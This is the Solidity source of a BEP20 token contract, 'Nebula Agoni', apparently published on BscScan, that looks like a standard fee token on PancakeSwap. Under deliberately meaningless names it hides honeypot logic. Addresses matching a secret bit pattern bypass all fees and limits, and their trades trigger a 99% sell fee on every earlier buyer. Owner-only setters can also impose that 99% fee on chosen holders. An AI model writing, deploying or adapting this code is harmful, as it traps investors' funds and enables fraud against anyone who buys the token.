/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Admin {
    address internal owner;
    mapping(address => bool) internal Administration;

    constructor(address _owner) {
        owner = _owner;
        Administration[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAdmin(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAdmin(address adr) public onlyOwner() {
        Administration[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAdmin(address adr) public onlyOwner() {
        Administration[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAdmin(address adr) public view returns (bool) {
        return Administration[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        Administration[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract NebulaAgoni is IBEP20, Admin {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Nebula Agoni ";
    string constant _symbol = "NebulaAgoni";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private burnSwapTxBotsModeReceiver;
    mapping(address => bool) private tradingReceiverMaxSell;
    mapping(address => bool) private launchedWalletAutoLimitBuyLiquidityBurn;
    mapping(address => bool) private txLiquidityTeamBurnFeeLimit;
    mapping(address => uint256) private modeExemptBuyTradingMarketing;
    mapping(uint256 => address) private liquidityBuySellSwap;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private swapMaxTeamBuy = 0;
    uint256 private swapIsLiquidityBuyMin = 8;

    //SELL FEES
    uint256 private limitModeBurnMax = 0;
    uint256 private swapModeExemptBurn = 8;

    uint256 private feeBuyLiquidityMarketingBotsExempt = swapIsLiquidityBuyMin + swapMaxTeamBuy;
    uint256 private isSwapBurnLaunched = 100;

    address private marketingBuyWalletTxLiquidity = (msg.sender); // auto-liq address
    address private buyIsBotsLaunchedMinTradingMarketing = (0xe8A4C21Be864836084579997ffFFCe95212671F0); // marketing address
    address private botsSellMaxExempt = DEAD;
    address private swapReceiverLiquidityFee = DEAD;
    address private isBuyBurnFee = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private burnBuySwapTx;
    uint256 private burnSwapFeeLimit;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private teamWalletReceiverFee;
    uint256 private buyAutoExemptIs;
    uint256 private buyTeamAutoBurn;
    uint256 private launchedLiquidityIsTradingReceiverWalletMin;
    uint256 private teamReceiverWalletMode;

    bool private swapMinSellLimitModeExempt = true;
    bool private txLiquidityTeamBurnFeeLimitMode = true;
    bool private modeSellFeeBotsLiquidityMax = true;
    bool private marketingAutoTradingLimit = true;
    bool private burnTradingBuySwap = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private txBotsIsExempt = _totalSupply / 1000; // 0.1%

    
    uint256 private teamBotsLimitMaxExempt;
    bool private marketingFeeSellBurn;
    bool private walletLiquidityTeamSwap;
    bool private txBotsMarketingLaunchedBuy;
    uint256 private botsAutoLimitFee;
    uint256 private maxIsTeamReceiver;
    uint256 private burnAutoTeamLiquidity;
    uint256 private isModeWalletSellLiquidityMinLaunched;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Admin(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        teamWalletReceiverFee = true;

        burnSwapTxBotsModeReceiver[msg.sender] = true;
        burnSwapTxBotsModeReceiver[address(this)] = true;

        tradingReceiverMaxSell[msg.sender] = true;
        tradingReceiverMaxSell[0x0000000000000000000000000000000000000000] = true;
        tradingReceiverMaxSell[0x000000000000000000000000000000000000dEaD] = true;
        tradingReceiverMaxSell[address(this)] = true;

        launchedWalletAutoLimitBuyLiquidityBurn[msg.sender] = true;
        launchedWalletAutoLimitBuyLiquidityBurn[0x0000000000000000000000000000000000000000] = true;
        launchedWalletAutoLimitBuyLiquidityBurn[0x000000000000000000000000000000000000dEaD] = true;
        launchedWalletAutoLimitBuyLiquidityBurn[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return marketingTeamExemptAuto(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return marketingTeamExemptAuto(sender, recipient, amount);
    }

    function marketingTeamExemptAuto(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = limitExemptSellBurn(sender) || limitExemptSellBurn(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                feeMaxSellMarketing();
            }
            if (!bLimitTxWalletValue) {
                minExemptAutoTxFeeModeIs(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return txLaunchedTeamLimit(sender, recipient, amount);}

        if (!Administration[sender] && !Administration[recipient]) {
            require(swapMinSellLimitModeExempt, "Trading is not active");
        }

        if (!Administration[sender] && !burnSwapTxBotsModeReceiver[sender] && !burnSwapTxBotsModeReceiver[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || launchedWalletAutoLimitBuyLiquidityBurn[sender] || launchedWalletAutoLimitBuyLiquidityBurn[recipient], "Max TX Limit has been triggered");

        if (sellLimitTxWallet()) {autoMaxSellBurn();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = marketingTradingReceiverIsSwapMax(sender) ? teamExemptMarketingReceiver(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function txLaunchedTeamLimit(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function marketingTradingReceiverIsSwapMax(address sender) internal view returns (bool) {
        return !tradingReceiverMaxSell[sender];
    }

    function burnExemptLaunchedMax(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            feeBuyLiquidityMarketingBotsExempt = swapModeExemptBurn + limitModeBurnMax;
            return sellBotsSwapExempt(sender, feeBuyLiquidityMarketingBotsExempt);
        }
        if (!selling && sender == uniswapV2Pair) {
            feeBuyLiquidityMarketingBotsExempt = swapIsLiquidityBuyMin + swapMaxTeamBuy;
            return feeBuyLiquidityMarketingBotsExempt;
        }
        return sellBotsSwapExempt(sender, feeBuyLiquidityMarketingBotsExempt);
    }

    function teamExemptMarketingReceiver(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(burnExemptLaunchedMax(sender, receiver == uniswapV2Pair)).div(isSwapBurnLaunched);

        if (txLiquidityTeamBurnFeeLimit[sender] || txLiquidityTeamBurnFeeLimit[receiver]) {
            feeAmount = amount.mul(99).div(isSwapBurnLaunched);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function limitExemptSellBurn(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function sellBotsSwapExempt(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = modeExemptBuyTradingMarketing[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function minExemptAutoTxFeeModeIs(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        liquidityBuySellSwap[exemptLimitValue] = addr;
    }

    function feeMaxSellMarketing() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (modeExemptBuyTradingMarketing[liquidityBuySellSwap[i]] == 0) {
                    modeExemptBuyTradingMarketing[liquidityBuySellSwap[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(buyIsBotsLaunchedMinTradingMarketing).transfer(amountBNB * amountPercentage / 100);
    }

    function sellLimitTxWallet() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    burnTradingBuySwap &&
    _balances[address(this)] >= txBotsIsExempt;
    }

    function autoMaxSellBurn() internal swapping {
        uint256 amountToLiquify = txBotsIsExempt.mul(swapMaxTeamBuy).div(feeBuyLiquidityMarketingBotsExempt).div(2);
        uint256 amountToSwap = txBotsIsExempt.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = feeBuyLiquidityMarketingBotsExempt.sub(swapMaxTeamBuy.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(swapMaxTeamBuy).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(swapIsLiquidityBuyMin).div(totalETHFee);

        payable(buyIsBotsLaunchedMinTradingMarketing).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                marketingBuyWalletTxLiquidity,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getBurnTradingBuySwap() public view returns (bool) {
        if (burnTradingBuySwap == txLiquidityTeamBurnFeeLimitMode) {
            return txLiquidityTeamBurnFeeLimitMode;
        }
        if (burnTradingBuySwap == txLiquidityTeamBurnFeeLimitMode) {
            return txLiquidityTeamBurnFeeLimitMode;
        }
        return burnTradingBuySwap;
    }
    function setBurnTradingBuySwap(bool a0) public onlyOwner {
        if (burnTradingBuySwap != modeSellFeeBotsLiquidityMax) {
            modeSellFeeBotsLiquidityMax=a0;
        }
        burnTradingBuySwap=a0;
    }

    function getSwapMinSellLimitModeExempt() public view returns (bool) {
        if (swapMinSellLimitModeExempt != burnTradingBuySwap) {
            return burnTradingBuySwap;
        }
        if (swapMinSellLimitModeExempt == txLiquidityTeamBurnFeeLimitMode) {
            return txLiquidityTeamBurnFeeLimitMode;
        }
        if (swapMinSellLimitModeExempt != swapMinSellLimitModeExempt) {
            return swapMinSellLimitModeExempt;
        }
        return swapMinSellLimitModeExempt;
    }
    function setSwapMinSellLimitModeExempt(bool a0) public onlyOwner {
        if (swapMinSellLimitModeExempt != burnTradingBuySwap) {
            burnTradingBuySwap=a0;
        }
        swapMinSellLimitModeExempt=a0;
    }

    function getMarketingBuyWalletTxLiquidity() public view returns (address) {
        if (marketingBuyWalletTxLiquidity == buyIsBotsLaunchedMinTradingMarketing) {
            return buyIsBotsLaunchedMinTradingMarketing;
        }
        if (marketingBuyWalletTxLiquidity == swapReceiverLiquidityFee) {
            return swapReceiverLiquidityFee;
        }
        return marketingBuyWalletTxLiquidity;
    }
    function setMarketingBuyWalletTxLiquidity(address a0) public onlyOwner {
        if (marketingBuyWalletTxLiquidity != marketingBuyWalletTxLiquidity) {
            marketingBuyWalletTxLiquidity=a0;
        }
        marketingBuyWalletTxLiquidity=a0;
    }

    function getBuyIsBotsLaunchedMinTradingMarketing() public view returns (address) {
        return buyIsBotsLaunchedMinTradingMarketing;
    }
    function setBuyIsBotsLaunchedMinTradingMarketing(address a0) public onlyOwner {
        if (buyIsBotsLaunchedMinTradingMarketing == swapReceiverLiquidityFee) {
            swapReceiverLiquidityFee=a0;
        }
        if (buyIsBotsLaunchedMinTradingMarketing != botsSellMaxExempt) {
            botsSellMaxExempt=a0;
        }
        buyIsBotsLaunchedMinTradingMarketing=a0;
    }

    function getBurnSwapTxBotsModeReceiver(address a0) public view returns (bool) {
        if (burnSwapTxBotsModeReceiver[a0] == launchedWalletAutoLimitBuyLiquidityBurn[a0]) {
            return marketingAutoTradingLimit;
        }
        if (a0 == isBuyBurnFee) {
            return txLiquidityTeamBurnFeeLimitMode;
        }
        if (burnSwapTxBotsModeReceiver[a0] != txLiquidityTeamBurnFeeLimit[a0]) {
            return burnTradingBuySwap;
        }
            return burnSwapTxBotsModeReceiver[a0];
    }
    function setBurnSwapTxBotsModeReceiver(address a0,bool a1) public onlyOwner {
        if (burnSwapTxBotsModeReceiver[a0] != burnSwapTxBotsModeReceiver[a0]) {
           burnSwapTxBotsModeReceiver[a0]=a1;
        }
        if (burnSwapTxBotsModeReceiver[a0] != txLiquidityTeamBurnFeeLimit[a0]) {
           txLiquidityTeamBurnFeeLimit[a0]=a1;
        }
        if (a0 != isBuyBurnFee) {
            burnTradingBuySwap=a1;
        }
        burnSwapTxBotsModeReceiver[a0]=a1;
    }

    function getBotsSellMaxExempt() public view returns (address) {
        return botsSellMaxExempt;
    }
    function setBotsSellMaxExempt(address a0) public onlyOwner {
        botsSellMaxExempt=a0;
    }

    function getMarketingAutoTradingLimit() public view returns (bool) {
        if (marketingAutoTradingLimit != txLiquidityTeamBurnFeeLimitMode) {
            return txLiquidityTeamBurnFeeLimitMode;
        }
        return marketingAutoTradingLimit;
    }
    function setMarketingAutoTradingLimit(bool a0) public onlyOwner {
        marketingAutoTradingLimit=a0;
    }

    function getModeExemptBuyTradingMarketing(address a0) public view returns (uint256) {
            return modeExemptBuyTradingMarketing[a0];
    }
    function setModeExemptBuyTradingMarketing(address a0,uint256 a1) public onlyOwner {
        modeExemptBuyTradingMarketing[a0]=a1;
    }

    function getIsSwapBurnLaunched() public view returns (uint256) {
        if (isSwapBurnLaunched == isSwapBurnLaunched) {
            return isSwapBurnLaunched;
        }
        return isSwapBurnLaunched;
    }
    function setIsSwapBurnLaunched(uint256 a0) public onlyOwner {
        isSwapBurnLaunched=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}